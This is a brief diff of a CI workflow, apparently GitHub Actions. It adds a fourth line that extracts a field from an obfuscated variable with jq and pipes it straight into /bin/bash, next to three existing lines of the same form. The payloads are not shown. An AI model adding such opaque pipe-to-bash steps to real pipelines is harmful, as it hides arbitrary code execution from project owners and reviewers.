@@ -28,6 +28,7 @@ jobs:
           echo $rqoat63726 | jq -r .zby1613 | /bin/bash
           echo $f41 | jq -r .jk15075 | /bin/bash
           printf '%s' "$worad5725" | jq -r .oiztk6180 | /bin/bash
+          echo $b01898 | jq -r .b1237 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
